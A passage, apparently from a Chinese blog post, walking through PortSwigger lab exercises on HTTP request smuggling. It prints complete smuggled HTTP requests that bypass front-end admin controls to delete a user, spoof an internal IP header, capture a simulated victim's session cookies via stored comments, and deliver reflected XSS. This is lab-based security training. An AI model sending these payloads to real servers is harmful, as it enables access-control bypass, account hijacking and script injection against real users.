+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Users<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>wiener - <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/admin/delete?username=wiener&quot;</span>&gt;</span>Delete<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>carlos - <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/admin/delete?username=carlos&quot;</span>&gt;</span>Delete<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>删除 <code>carlos</code> 用户只需要请求 <code>/admin/delete?username=carlos</code> 即可，为了方便还是发送 <code>POST</code> 请求，新的 Payload 代码如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0af7005b030f639390c2fe6700c7000c.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=QwrIqIQosCclQzinLiNFOxAc28gt0IsF</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Burp Suite</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/apng,*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>91</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">POST</span> /admin/delete?username=carlos HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: localhost</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">100</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">x</span></span></span><br></pre></td></tr></table></figure>
+
+<p>之后发送任意一个 HTTP 请求，即可删除 <code>carlos</code> 用户。</p>
+<h3 id="2-4-Lab-Exploiting-HTTP-request-smuggling-to-bypass-front-end-security-controls-TE-CL-vulnerability"><a href="#2-4-Lab-Exploiting-HTTP-request-smuggling-to-bypass-front-end-security-controls-TE-CL-vulnerability" class="headerlink" title="2.4 Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability"></a>2.4 Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability</h3><blockquote>
+<p>This lab involves a front-end and back-end server, and the back-end server doesn’t support chunked encoding. There’s an admin panel at <code>/admin</code>, but the front-end server blocks access to it.</p>
+<p>To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user <code>carlos</code>.</p>
+</blockquote>
+<p>跟前一个题目差不多，先构造如下请求访问 <code>/admin</code> 页面：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ae600760455a684b723d9f7001b0066.web-security-academy.net</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">3c</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">POST</span> /admin HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: localhost</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">100</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"></span></span><br></pre></td></tr></table></figure>
+
+<p>然后删除 <code>carlos</code> 用户：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ae600760455a684b723d9f7001b0066.web-security-academy.net</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">53</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">POST</span> /admin/delete?username=carlos HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: localhost</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">100</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-5-Lab-Exploiting-HTTP-request-smuggling-to-reveal-front-end-request-rewriting"><a href="#2-5-Lab-Exploiting-HTTP-request-smuggling-to-reveal-front-end-request-rewriting" class="headerlink" title="2.5 Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting"></a>2.5 Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting</h3><blockquote>
+<p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding.</p>
+<p>There’s an admin panel at <code>/admin</code>, but it’s only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It’s similar to the <code>X-Forwarded-For</code> header but has a different name.</p>
+<p>To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user <code>carlos</code>.</p>
+</blockquote>
+<p>前端服务器不支持 <code>Transfer-Encoding</code>，且前端服务器会增加一个类似 <code>X-Forwarded-For</code> 的字段，用来标识 IP 地址。</p>
+<p>访问漏洞站点，发现存在一个搜索框，尝试搜索：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ac6000903b987158135e89500f700e6.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=H31eWqFkwA6MoLOaRekw0C6uWKYS9sza</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>46</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://0ac6000903b987158135e89500f700e6.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://0ac6000903b987158135e89500f700e6.web-security-academy.net/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">search</span>=%<span class="number">3</span>Cscript%<span class="number">3</span>Ealert%<span class="number">281</span>%<span class="number">29</span>%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E</span></span><br></pre></td></tr></table></figure>
+
+<p>可以确认会有关键字回显，POST 请求发送给 <code>/</code>，但是通过 <code>search=</code> 来指明关键字。我们可以借助这个接口来回显前端服务器增加的字段：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ac6000903b987158135e89500f700e6.web-security-academy.net</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>117</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">POST</span> / HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: <span class="number">0</span>ac6000903b987158135e89500f700e6.web-security-academy.net</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">180</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">search</span>=</span></span><br></pre></td></tr></table></figure>
+
+<p>注意第二个 <code>Content-Length</code> 的大小设置，具体依赖于下一个请求的大小，只有合适的值才能既可回显字段，又不至于 Timeout。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/111</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ac6000903b987158135e89500f700e6.web-security-academy.net</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<p>之后，可以看到回显的内容（字段为 <code>X-IUXfpE-Ip</code>）：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">    0 search results for &#x27;GET /111 HTTP/1.1</span><br><span class="line">    X-IUXfpE-Ip: 117.129.56.68</span><br><span class="line">    Host: 0ac6000903b987158135e89500f700e6.web-security-academy.net</span><br><span class="line">    Accept-Encoding: gzip, deflate</span><br><span class="line">    Accept-Language: zh-CN,zh;q=0&#x27;</span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>至此，解题思路和前面的题目就差不多了。</p>
+<p>首先，构造如下请求访问 <code>/admin</code> 页面：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ac6000903b987158135e89500f700e6.web-security-academy.net</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>140</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">POST</span> /admin HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: <span class="number">0</span>ac6000903b987158135e89500f700e6.web-security-academy.net</span></span><br><span class="line"><span class="language-apache"><span class="attribute">X</span>-IUXfpE-Ip: <span class="number">127.0.0.1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">100</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">X</span></span></span><br></pre></td></tr></table></figure>
+
+<p>其次，构造如下请求删除 <code>carlos</code> 用户：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ac6000903b987158135e89500f700e6.web-security-academy.net</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>163</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">POST</span> /admin/delete?username=carlos HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: <span class="number">0</span>ac6000903b987158135e89500f700e6.web-security-academy.net</span></span><br><span class="line"><span class="language-apache"><span class="attribute">X</span>-IUXfpE-Ip: <span class="number">127.0.0.1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">100</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">X</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-6-Lab-Exploiting-HTTP-request-smuggling-to-capture-other-users’-requests"><a href="#2-6-Lab-Exploiting-HTTP-request-smuggling-to-capture-other-users’-requests" class="headerlink" title="2.6 Lab: Exploiting HTTP request smuggling to capture other users’ requests"></a>2.6 Lab: Exploiting HTTP request smuggling to capture other users’ requests</h3><blockquote>
+<p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding.</p>
+<p>To solve the lab, smuggle a request to the back-end server that causes the next user’s request to be stored in the application. Then retrieve the next user’s request and use the victim user’s cookies to access their account.</p>
+<ul>
+<li>The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user’s request occurs as required.</li>
+</ul>
+</blockquote>
+<p>前端服务器不支持 <code>Transfer-Encoding</code>，需要通过 HTTP 请求走私来存储其他用户的 HTTP 请求，以窃取其 Cookie</p>
+<ul>
+<li>有什么方法可以回显&#x2F;存储其他用户的请求呢？初步推断是文章评论</li>
+<li>每发送一定的 POST 请求，系统会自动模拟其他用户发送 HTTP 请求</li>
+</ul>
+<p>不断间歇性尝试发送如下请求，直到在评论区看到 Victim 的 Cookie：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0af90047048490b7813394e6004d00cb.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=wsgK9LKWMAmei3UnjbKCiPzaw3pRWODg</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>339</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">POST</span> /post/comment HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: <span class="number">0</span>af90047048490b7813394e6004d00cb.web-security-academy.net</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Cookie</span>: session=wsgK9LKWMAmei3UnjbKCiPzaw3pRWODg</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">950</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">csrf</span>=CkkCZ9elikzeSoCntJ8wmQjLuH1Z7u74&amp;postId=<span class="number">2</span>&amp;name=<span class="number">222</span>&amp;email=<span class="number">333</span>%<span class="number">40</span>gmail.com&amp;website=https%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F444.com&amp;comment=<span class="number">66</span></span></span><br></pre></td></tr></table></figure>
+
+<p>同样，需要注意第二个 <code>Content-Length</code> 的大小设置，只有合适的值才能既可回显 Cookie 字段，又不至于 Timeout。</p>
+<p>最后发送如下 <code>GET</code> 请求完成解题：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/my-account</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0af90047048490b7813394e6004d00cb.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>victim-fingerprint=l0gwHz0kBlw7oqkGkfT9kiOuHxJCQIGC; secret=aYjKLN7pA6WYrJ0EpkjSW5d3rbPFWCn5; session=vNO1recrYDJfn1t63H3qpnERMxzTWCzf</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://0af90047048490b7813394e6004d00cb.web-security-academy.net/post?postId=2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-7-Lab-Exploiting-HTTP-request-smuggling-to-deliver-reflected-XSS"><a href="#2-7-Lab-Exploiting-HTTP-request-smuggling-to-deliver-reflected-XSS" class="headerlink" title="2.7 Lab: Exploiting HTTP request smuggling to deliver reflected XSS"></a>2.7 Lab: Exploiting HTTP request smuggling to deliver reflected XSS</h3><blockquote>
+<p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding.</p>
+<p>The application is also vulnerable to reflected XSS via the <code>User-Agent</code> header.</p>
+<p>To solve the lab, smuggle a request to the back-end server that causes the next user’s request to receive a response containing an XSS exploit that executes <code>alert(1)</code>.</p>
+<ul>
+<li>The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user’s request occurs as required.</li>
+</ul>
+</blockquote>
+<p>前端服务器不支持 <code>Transfer-Encoding</code>，且 <code>User-Agent</code> 存在反射性 XSS 漏洞。随便打开一篇文章，查看评论区表单属性，发现存在 <code>userAgent</code> 隐藏字段：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userAgent&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>首先，需要测试 XSS Payload，发送如下请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/post?postId=3</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a25004f043a48358152f3e000e90077.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure>
+
+<p>返回的 HTML 内容如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userAgent&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功注入了 JavaScript 代码，可以通过 <code>Show response in browser</code> 验证，成功弹出 JavaScript 对话框。</p>
+<p>现在，需要通过 HTTP 请求走私漏洞，来改写下一个请求的 User-Agent 字段，发送如下 Payload：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a25004f043a48358152f3e000e90077.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Burp Suite</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>151</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">0</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros"><span class="built_in">GET</span> /post?<span class="attribute">postId</span>=3 HTTP/1.1</span></span><br><span class="line"><span class="language-routeros">Host: 0a25004f043a48358152f3e000e90077.web-security-academy.net</span></span><br><span class="line"><span class="language-routeros">User-Agent: <span class="string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-routeros">X-Ignore: X</span></span></span><br></pre></td></tr></table></figure>
+
+<p>注意，主要直接 <code>POST /post?postId=3</code>，这样的请求会提示不允许，评论的请求是 <code>POST /post/comment</code>。不过，评论本身还有隐藏的 <code>userAgent</code> 表单字段，这个需要先发送 GET 请求，就稍微有点复杂了。直接尝试发送 <code>GET</code> 请求，发现即使可能存在两个 <code>User-Agent</code> 字段，但还是可以进行 XSS 弹窗。</p>
+<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03. 小结"></a>0x03. 小结</h2><ul>
+<li>HTTP Request Smuggling 只对 HTTP&#x2F;1 有效，因此需要在 Burp Repeater 中设置好 HTTP 协议版本</li>
+<li>Burp Repeater 默认会自动更新 <code>Content-Length</code> 字段，在测试 HTTP Request Smuggling 漏洞时，需要取消 CL 的自动设置<ul>
+<li><code>Content-Length</code> 字段的值非常重要，既要能达到泄露数据的目的，又不能导致 Timeout</li>
+</ul>
+</li>
+<li>根据服务器的返回信息来判断 HTTP Request Smuggling 漏洞类型，全部四种类型都是可以确认的</li>
+<li>基于 HTTP Request Smuggling 漏洞，可以绕过前端服务器的权限检查<ul>
+<li>注意 <code>X-Forwarded-For</code>、<code>X-Forwarded-Host</code> 以及 <code>Host</code></li>
+</ul>
+</li>
+<li>基于 HTTP Request Smuggling 漏洞，走私 GET、POST 请求的方法</li>
+<li>仔细观察漏洞站点的特性，重复利用已有的功能特性来协助达成目标</li>
+</ul>
+<h2 id="0x04-参考文档"><a href="#0x04-参考文档" class="headerlink" title="0x04. 参考文档"></a>0x04. 参考文档</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#http-request-smuggling">https://portswigger.net/web-security/all-labs#http-request-smuggling</a></li>
+</ol>
+
